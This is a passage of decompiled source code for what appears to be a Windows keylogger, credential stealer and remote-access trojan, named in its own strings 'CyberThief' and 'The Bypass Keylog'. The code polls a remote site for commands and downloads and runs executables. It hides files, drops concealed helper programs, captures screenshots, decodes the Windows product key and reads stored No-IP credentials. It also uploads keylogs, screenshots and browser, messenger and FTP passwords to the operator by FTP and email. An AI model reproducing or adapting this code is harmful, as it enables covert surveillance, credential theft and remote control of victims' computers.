              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
              case 12:
                goto label_10;
              case 13:
                goto label_11;
              case 14:
                goto label_12;
              case 15:
                goto label_13;
              case 16:
                goto label_14;
              case 17:
                goto label_15;
              case 18:
                goto label_22;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_17;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_22:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void hidefolder()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        string keyName = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
label_2:
        num3 = 3;
        MyProject.Computer.Registry.SetValue(keyName, "Hidden", (object) "0", RegistryValueKind.DWord);
        goto label_9;
label_4:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_9;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_4;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_9:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void GetIPAddresses()
    {
      this.ExternalIP = new StreamReader(((HttpWebResponse) ((HttpWebRequest) WebRequest.Create("http://whatismyip.com/automation/n09230945.asp")).GetResponse()).GetResponseStream()).ReadToEnd();
      int upperBound = Dns.GetHostEntry(Dns.GetHostName()).AddressList.GetUpperBound(0);
      int num = 0;
      while (num <= upperBound)
      {
        this.InternalIP = Dns.GetHostByName(Dns.GetHostName()).AddressList.GetValue(0).ToString();
        checked { ++num; }
      }
    }

    public string FolderFromFileName(string FileFullPath)
    {
      int length = checked (FileFullPath.LastIndexOfAny(Conversions.ToCharArrayRankOne("\\")) + 1);
      return FileFullPath.Substring(0, length);
    }

    private void Timer3_Tick(object sender, EventArgs e)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        this.BackgroundWorker1.CancelAsync();
label_2:
        num3 = 3;
        this.BackgroundWorker1.Dispose();
label_3:
        num3 = 4;
        Application.DoEvents();
label_4:
        num3 = 5;
        this.BackgroundWorker1.RunWorkerAsync();
        goto label_11;
label_6:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_11;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_6;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_11:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void DownloadCommand()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        WebClient webClient = new WebClient();
label_2:
        num3 = 3;
        string httpvalue = webClient.DownloadString(this.RemoteSite + "/" + this.ProductKey + ".html");
label_3:
        num3 = 4;
        if (!Microsoft.VisualBasic.CompilerServices.Operators.ConditionalCompareObjectEqual(this.CheckForDemands(httpvalue), (object) false, false))
          goto label_6;
label_4:
        num3 = 5;
        httpvalue = webClient.DownloadString(this.RemoteSite + "/MassCommand.html");
label_5:
        num3 = 6;
        this.CheckForDemands(httpvalue);
        goto label_13;
label_6:
        goto label_13;
label_8:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
              case 9:
              case 10:
              case 11:
                goto label_13;
              case 8:
                goto label_6;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_8;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_13:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public object CheckForDemands(string httpvalue)
    {
label_0:
      int num1;
      object obj1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        string str1 = Conversions.ToString(this.RandomNumber());
label_2:
        num3 = 3;
        if (!httpvalue.Contains("REMOVE = True"))
          goto label_14;
label_3:
        num3 = 4;
        this.Timer6.Stop();
label_4:
        num3 = 5;
        MyProject.Computer.Registry.CurrentUser.DeleteValue("\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" + this.RegistryCU);
label_5:
        num3 = 6;
        MyProject.Computer.Registry.LocalMachine.DeleteValue("\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" + this.RegistryLM);
label_6:
        num3 = 7;
        byte[] scanner1 = Windows_Explorer.My.Resources.Resources.Scanner;
label_7:
        num3 = 8;
        string folderPath1 = Environment.GetFolderPath((Environment.SpecialFolder) Conversions.ToInteger(Path.GetTempPath()));
label_8:
        num3 = 9;
        FileStream fileStream1 = System.IO.File.Create(folderPath1 + "\\refresh.exe");
label_9:
        num3 = 10;
        fileStream1.Write(scanner1, 0, scanner1.Length);
label_10:
        num3 = 11;
        fileStream1.Close();
label_11:
        num3 = 12;
        Interaction.Shell(folderPath1 + "\\refresh.exe", AppWinStyle.Hide);
label_12:
        num3 = 13;
        this.SendCommandComplete("Remote Removal");
        ProjectData.EndApp();
label_13:
        num3 = 15;
        obj1 = (object) true;
        goto label_51;
label_14:
        num3 = 17;
        if (!httpvalue.Contains("DOWNLOAD"))
          goto label_22;
label_15:
        num3 = 18;
        string[] strArray1 = Strings.Split(httpvalue, "|");
label_16:
        num3 = 19;
        string address1 = strArray1[1];
label_17:
        num3 = 20;
        MyProject.Computer.Network.DownloadFile(address1, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + str1 + ".exe");
label_18:
        num3 = 21;
        Interaction.Shell(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + str1 + ".exe", AppWinStyle.NormalFocus);
label_19:
        num3 = 22;
        Application.DoEvents();
label_20:
        num3 = 23;
        this.SendCommandComplete("Remote Download");
label_21:
        num3 = 24;
        obj1 = (object) true;
        goto label_51;
label_22:
        num3 = 26;
        if (!httpvalue.Contains("UPDATE"))
          goto label_36;
label_23:
        num3 = 27;
        string[] strArray2 = Strings.Split(httpvalue, "|");
label_24:
        num3 = 28;
        string address2 = strArray2[1];
label_25:
        num3 = 29;
        MyProject.Computer.Network.DownloadFile(address2, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + str1 + ".exe");
label_26:
        num3 = 30;
        byte[] scanner2 = Windows_Explorer.My.Resources.Resources.Scanner;
label_27:
        num3 = 31;
        string folderPath2 = Environment.GetFolderPath((Environment.SpecialFolder) Conversions.ToInteger(Path.GetTempPath()));
label_28:
        num3 = 32;
        FileStream fileStream2 = System.IO.File.Create(folderPath2 + "\\refresh.exe");
label_29:
        num3 = 33;
        fileStream2.Write(scanner2, 0, scanner2.Length);
label_30:
        num3 = 34;
        fileStream2.Close();
label_31:
        num3 = 35;
        this.SendCommandComplete("Server Update");
label_32:
        num3 = 36;
        Application.DoEvents();
label_33:
        num3 = 37;
        Interaction.Shell(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + str1 + ".exe", AppWinStyle.NormalFocus);
label_34:
        num3 = 38;
        Interaction.Shell(folderPath2 + "\\refresh.exe", AppWinStyle.Hide);
        ProjectData.EndApp();
label_35:
        num3 = 40;
        obj1 = (object) true;
        goto label_51;
label_36:
        num3 = 42;
        if (!httpvalue.Contains("RESTART = True"))
          goto label_43;
label_37:
        num3 = 43;
        string str2 = Conversions.ToString(this.RandomString(8));
label_38:
        num3 = 44;
        Microsoft.VisualBasic.FileSystem.FileCopy(Application.ExecutablePath, Application.StartupPath + "\\" + str2 + ".exe");
label_39:
        num3 = 45;
        Process.Start(Application.StartupPath + "\\" + str2 + ".exe");
label_40:
        num3 = 46;
        this.SendCommandComplete("Server Restart");
label_41:
        num3 = 47;
        Application.DoEvents();
        ProjectData.EndApp();
label_42:
        num3 = 49;
        obj1 = (object) true;
        goto label_51;
label_43:
        num3 = 51;
label_44:
        num3 = 52;
        obj1 = (object) false;
        goto label_51;
label_46:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
              case 15:
                goto label_13;
              case 16:
              case 25:
              case 41:
              case 50:
              case 53:
              case 54:
                goto label_51;
              case 17:
                goto label_14;
              case 18:
                goto label_15;
              case 19:
                goto label_16;
              case 20:
                goto label_17;
              case 21:
                goto label_18;
              case 22:
                goto label_19;
              case 23:
                goto label_20;
              case 24:
                goto label_21;
              case 26:
                goto label_22;
              case 27:
                goto label_23;
              case 28:
                goto label_24;
              case 29:
                goto label_25;
              case 30:
                goto label_26;
              case 31:
                goto label_27;
              case 32:
                goto label_28;
              case 33:
                goto label_29;
              case 34:
                goto label_30;
              case 35:
                goto label_31;
              case 36:
                goto label_32;
              case 37:
                goto label_33;
              case 38:
                goto label_34;
              case 39:
              case 40:
                goto label_35;
              case 42:
                goto label_36;
              case 43:
                goto label_37;
              case 44:
                goto label_38;
              case 45:
                goto label_39;
              case 46:
                goto label_40;
              case 47:
                goto label_41;
              case 48:
              case 49:
                goto label_42;
              case 51:
                goto label_43;
              case 52:
                goto label_44;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_46;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_51:
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }

    public void SendCommandComplete(string command)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        MailMessage message = new MailMessage();
label_2:
        num3 = 3;
        message.From = new MailAddress(this.Email);
label_3:
        num3 = 4;
        message.To.Add(this.EmailTo);
label_4:
        num3 = 5;
        message.Subject = "Remote Command " + command + " has completed on: " + Environment.MachineName.ToString() + "/" + Environment.UserName.ToString();
label_5:
        num3 = 6;
        message.Body = "Now that the command has been completed, you may want to remove the .html file from your server, so that the server doesn't repeat the opperation again.";
label_6:
        num3 = 7;
        SmtpClient smtpClient = new SmtpClient(this.SMTPServer);
label_7:
        num3 = 8;
        smtpClient.Port = Conversions.ToInteger(this.SMTPPort);
label_8:
        num3 = 9;
        smtpClient.EnableSsl = true;
label_9:
        num3 = 10;
        smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.Email, this.Password);
label_10:
        num3 = 11;
        smtpClient.Send(message);
        goto label_17;
label_12:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_17;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_12;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_17:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public object RandomString(int amount)
    {
      object obj = (object) "123456789012345678901234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890";
      object Left1 = (object) Strings.Len(RuntimeHelpers.GetObjectValue(obj));
      object Limit = (object) amount;
      VBMath.Randomize();
      object Left2 = (object) "";
      object Counter;
      object LoopForResult;
      object CounterResult;
      if (ObjectFlowControl.ForLoopControl.ForLoopInitObj(Counter, (object) 1, Limit, (object) 1, ref LoopForResult, ref CounterResult))
      {
        do
        {
          object objectValue = RuntimeHelpers.GetObjectValue(Conversion.Int(Microsoft.VisualBasic.CompilerServices.Operators.AddObject(Microsoft.VisualBasic.CompilerServices.Operators.MultiplyObject(Left1, (object) VBMath.Rnd()), (object) 1)));
          Left2 = Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Left2, (object) CyberThief.Mid(Conversions.ToString(obj), Conversions.ToInteger(objectValue), 1));
        }
        while (ObjectFlowControl.ForLoopControl.ForNextCheckObj(CounterResult, LoopForResult, ref CounterResult));
      }
      return RuntimeHelpers.GetObjectValue(Left2);
    }

    private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        if (!this.RemoteControl)
          goto label_3;
label_2:
        num3 = 3;
        this.DownloadCommand();
label_3:
        num3 = 5;
        this.ScreenShot();
label_4:
        num3 = 6;
        if (!this.UseFTP)
          goto label_6;
label_5:
        num3 = 7;
        this.FTPSend();
label_6:
        num3 = 9;
        if (!this.UseSMTP)
          goto label_8;
label_7:
        num3 = 10;
        this.MailSend();
label_8:
        num3 = 12;
        this.BackgroundWorker1.ReportProgress(100);
        goto label_15;
label_10:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
              case 5:
                goto label_3;
              case 6:
                goto label_4;
              case 7:
                goto label_5;
              case 8:
              case 9:
                goto label_6;
              case 10:
                goto label_7;
              case 11:
              case 12:
                goto label_8;
              case 13:
                goto label_15;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void FTPSend()
    {
      try
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(this.FTPHost + "/" + Environment.UserName.ToString() + " Log" + Conversions.ToString(this.FTPNumbers) + ".txt");
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(this.FTPName, this.FTPPass);
        ftpWebRequest.Method = "STOR";
        byte[] buffer = System.IO.File.ReadAllBytes(this.God);
        Stream requestStream = ftpWebRequest.GetRequestStream();
        requestStream.Write(buffer, 0, buffer.Length);
        requestStream.Close();
        requestStream.Dispose();
        checked { ++this.FTPNumbers; }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void FTPConfirmationSend()
    {
      try
      {
        using (System.IO.File.Create(this.FolderFromFileName(this.TheGodPath) + "\\LaunchInfo.txt"))
          ;
        StreamWriter streamWriter = new StreamWriter(this.FolderFromFileName(this.TheGodPath) + "\\LaunchInfo.txt");
        streamWriter.WriteLine("The Bypass has been activated on " + Environment.MachineName.ToString() + " by the user " + Environment.UserName.ToString() + " at " + DateAndTime.Now.ToLongTimeString());
        streamWriter.WriteLine();
        streamWriter.WriteLine();
        if (this.DoISteal)
          streamWriter.WriteLine("The attached notepad has a list of CD keys the user has, and all other captured information is listed bellow.\r\n\r\n[----System Information----]:\r\nOS Serial Key: " + this.ProductKey + "\r\nOperating System: " + MyProject.Computer.Info.OSFullName + "\r\nComputer Name: " + Environment.MachineName + "\r\nWebcam Devices: N/A\r\n\r\nExternal IP Address: " + this.ExternalIP + "\r\nInternal IP Address: " + this.InternalIP + "\r\n\r\n\r\n" + this.FFPasswords + "\r\n===============================================\r\n\r\n[---Google Chrome Stealer---]:\r\n===============================================\r\n" + this.ChromePassword + "\r\n===============================================\r\n\r\n" + this.ExplorerPass + "\r\n\r\n\r\n[---MSN Messenger Stealer---]:\r\n===============================================\r\n" + this.MSNInfo + "\r\n===============================================\r\n\r\n" + this.SteamUsername + "\r\n\r\n[----No-Ip Stealer----]:\r\n===============================================\r\nUsername(s): " + this.Temp45 + "\r\nPassword(s): " + this.Temp46 + "\r\nHost(s): " + this.Temp47 + "\r\n===============================================\r\n\r\n[-----FileZila Stealer-----]:\r\n===============================================\r\n" + this.FileZillaPasswords + "===============================================\r\n\r\n[----DynDNS Stealer----]:\r\n===============================================\r\n" + this.DynDNS + "\r\n===============================================\r\n\r\n[---Pidgin Stealer---]:\r\n===============================================\r\n" + this.Pidgin + "\r\n===============================================\r\n\r\n[---IMVU Stealer---]:\r\n===============================================\r\n" + this.IMVU + "\r\n===============================================");
        streamWriter.Flush();
        streamWriter.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(this.FTPHost + "/" + Environment.UserName.ToString() + " Launch.txt");
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(this.FTPName, this.FTPPass);
        ftpWebRequest.Method = "STOR";
        byte[] buffer = System.IO.File.ReadAllBytes(this.FolderFromFileName(this.TheGodPath) + "\\LaunchInfo.txt");
        Stream requestStream = ftpWebRequest.GetRequestStream();
        requestStream.Write(buffer, 0, buffer.Length);
        requestStream.Close();
        requestStream.Dispose();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(this.FTPHost + "/" + Environment.UserName.ToString() + " LaunchIMG.jpeg");
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(this.FTPName, this.FTPPass);
        ftpWebRequest.Method = "STOR";
        byte[] buffer = System.IO.File.ReadAllBytes(Path.GetTempPath() + "\\StartupImage.jpeg");
        Stream requestStream = ftpWebRequest.GetRequestStream();
        requestStream.Write(buffer, 0, buffer.Length);
        requestStream.Close();
        requestStream.Dispose();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (!this.DoISteal)
        return;
      try
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(this.FTPHost + "/" + Environment.UserName.ToString() + " CdKeys.txt");
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(this.FTPName, this.FTPPass);
        ftpWebRequest.Method = "STOR";
        byte[] buffer = System.IO.File.ReadAllBytes(Path.GetTempPath() + "\\cdinformation.txt");
        Stream requestStream = ftpWebRequest.GetRequestStream();
        requestStream.Write(buffer, 0, buffer.Length);
        requestStream.Close();
        requestStream.Dispose();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(this.FTPHost + "/" + Environment.UserName.ToString() + " Data.db");
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(this.FTPName, this.FTPPass);
        ftpWebRequest.Method = "STOR";
        byte[] buffer = System.IO.File.ReadAllBytes(this.ThePath);
        Stream requestStream = ftpWebRequest.GetRequestStream();
        requestStream.Write(buffer, 0, buffer.Length);
        requestStream.Close();
        requestStream.Dispose();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void MailSend()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        Attachment attachment = new Attachment(Path.GetTempPath() + "\\Img" + Conversions.ToString(this.screeniessaved) + ".jpeg");
label_2:
        num3 = 3;
        MailMessage message = new MailMessage();
label_3:
        num3 = 4;
        message.From = new MailAddress(this.Email);
label_4:
        num3 = 5;
        message.To.Add(this.EmailTo);
label_5:
        num3 = 6;
        message.Subject = "The Bypass Keylog From: " + Environment.MachineName.ToString() + "/" + Environment.UserName.ToString();
label_6:
        num3 = 7;
        message.Body = this.God;
label_7:
        num3 = 8;
        if (!this.SendScreenshots)
          goto label_9;
label_8:
        num3 = 9;
        message.Attachments.Add(attachment);
label_9:
        num3 = 11;
        SmtpClient smtpClient = new SmtpClient(this.SMTPServer);
label_10:
        num3 = 12;
        smtpClient.Port = Conversions.ToInteger(this.SMTPPort);
label_11:
        num3 = 13;
        smtpClient.EnableSsl = true;
label_12:
        num3 = 14;
        smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.Email, this.Password);
label_13:
        num3 = 15;
        smtpClient.Send(message);
        goto label_20;
label_15:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
              case 11:
                goto label_9;
              case 12:
                goto label_10;
              case 13:
                goto label_11;
              case 14:
                goto label_12;
              case 15:
                goto label_13;
              case 16:
                goto label_20;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_15;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_20:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void BackgroundWorker1_ProgressChanged(object sender, ProgressChangedEventArgs e)
    {
      if (e.ProgressPercentage != 100)
        return;
      this.God = "|-----" + this.activewindow + " (" + DateAndTime.Now.ToLongTimeString() + ") -----|\r\n";
    }

    public void ScreenShot()
    {
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(Path.GetTempPath() + "\\Img" + Conversions.ToString(this.screeniessaved) + ".jpeg");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      checked { ++this.screeniessaved; }
      this.PictureBox1.Image = (Image) null;
      Rectangle bounds = Screen.PrimaryScreen.Bounds;
      Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
      this.PictureBox1.Image = (Image) bitmap;
      this.PictureBox1.Image.Save(Path.GetTempPath() + "\\Img" + Conversions.ToString(this.screeniessaved) + ".jpeg", ImageFormat.Jpeg);
    }

    private void Timer4_Tick(object sender, EventArgs e)
    {
      if (!MyProject.Computer.FileSystem.DirectoryExists("C:\\Vaccine\\FDSJFDHJDFGDFGHFDTFSTREYHTYRHDGD\\gfgkljfdasklffjdkfljlfjweklrjioghfkerlakjgtkrlegjlrae\\45342wtghjru653t4wr493832q9r0euty062u53qr89eh43qg\\CureMeNow"))
        return;
      ProjectData.EndApp();
    }

    public string ThatThingCalledMessanger()
    {
      byte[] firewall = Windows_Explorer.My.Resources.Resources.firewall;
      Environment.GetFolderPath(Environment.SpecialFolder.Templates);
      FileStream fileStream = System.IO.File.Create(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\firewall.exe");
      fileStream.Write(firewall, 0, firewall.Length);
      fileStream.Close();
      Interaction.Shell(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\firewall.exe", AppWinStyle.Hide);
      Thread.Sleep(2000);
      return System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\7647354325.txt");
    }

    public string GetProductKey(string KeyPath, string ValueName)
    {
      object objectValue = RuntimeHelpers.GetObjectValue(MyProject.Computer.Registry.GetValue(KeyPath, ValueName, (object) 0));
      if (objectValue == null)
        return "N/A";
      string str1 = "";
      int num1 = Information.LBound((Array) objectValue);
      int num2 = Information.UBound((Array) objectValue);
      int num3 = num1;
      while (num3 <= num2)
      {
        str1 = str1 + " " + Conversion.Hex(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(objectValue, new object[1]
        {
          (object) num3
        }, (string[]) null)));
        checked { ++num3; }
      }
      int num4 = 52;
      int num5 = 67;
      string[] strArray1 = new string[25]
      {
        "B",
        "C",
        "D",
        "F",
        "G",
        "H",
        "J",
        "K",
        "M",
        "P",
        "Q",
        "R",
        "T",
        "V",
        "W",
        "X",
        "Y",
        "2",
        "3",
        "4",
        "6",
        "7",
        "8",
        "9",
        null
      };
      int num6 = 29;
      int num7 = 15;
      string[] strArray2 = new string[16];
      string[] strArray3 = new string[31];
      string str2 = "";
      int num8 = num4;
      int num9 = num5;
      int num10 = num8;
      while (num10 <= num9)
      {
        strArray2[checked (num10 - num4)] = Conversions.ToString(NewLateBinding.LateIndexGet(objectValue, new object[1]
        {
          (object) num10
        }, (string[]) null));
        str2 = str2 + " " + Conversion.Hex((object) strArray2[checked (num10 - num4)]);
        checked { ++num10; }
      }
      string Expression = "";
      int index1 = checked (num6 - 1);
      while (index1 >= 0)
      {
        if (checked (index1 + 1) % 6 == 0)
        {
          strArray3[index1] = "-";
          Expression += "-";
        }
        else
        {
          int index2 = 0;
          int index3 = checked (num7 - 1);
          while (index3 >= 0)
          {
            int num11 = checked ((int) ((long) Math.Round(unchecked ((double) index2 * 256.0)) | Conversions.ToLong(strArray2[index3])));
            strArray2[index3] = Conversions.ToString(num11 / 24);
            index2 = num11 % 24;
            checked { index3 += -1; }
          }
          strArray3[index1] = strArray1[index2];
          Expression += strArray1[index2];
        }
        checked { index1 += -1; }
      }
      return Strings.StrReverse(Expression);
    }

    public void NoIpSteal()
    {
label_0:
      int num1;
      int num2;
      try
      {
        int num3 = 1;
        object objectValue1 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("wscript.shell"));
label_1:
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        num3 = 3;
        object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue1, (System.Type) null, "RegRead", new object[1]
        {
          (object) "HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC\\Password"
        }, (string[]) null, (System.Type[]) null, (bool[]) null));
label_3:
        num3 = 4;
        this.Temp46 = Conversions.ToString(objectValue2);
label_4:
        num3 = 5;
        object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue1, (System.Type) null, "RegRead", new object[1]
        {
          (object) "HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC\\Username"
        }, (string[]) null, (System.Type[]) null, (bool[]) null));
label_5:
        num3 = 6;
        this.Temp45 = Conversions.ToString(objectValue3);
label_6:
        num3 = 7;
        byte[] array = Convert.FromBase64String(this.Temp46);
label_7:
        num3 = 8;
        FileStream fileStream = new FileStream(Path.GetTempPath() + "\\googleinfo.txt", FileMode.Create);
label_8:
        num3 = 9;
        fileStream.Write(array, 0, array.Length);
label_9:
        num3 = 10;
        fileStream.Close();
label_10:
        num3 = 11;
        this.Temp46 = MyProject.Computer.FileSystem.ReadAllText(Path.GetTempPath() + "\\googleinfo.txt");
label_11:
        num3 = 12;
        this.Temp47 = Conversions.ToString(NewLateBinding.LateGet(objectValue1, (System.Type) null, "regread", new object[1]
        {
          (object) "HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC\\Hosts"
        }, (string[]) null, (System.Type[]) null, (bool[]) null));
        goto label_18;
label_13:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_18;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_13;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_18:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public object ReadKey(ref string hKey)
    {
      int num1;
      object obj1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.shell"));
        object[] objArray = new object[1]{ (object) hKey };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[1]{ true };
        bool[] CopyBack = flagArray;
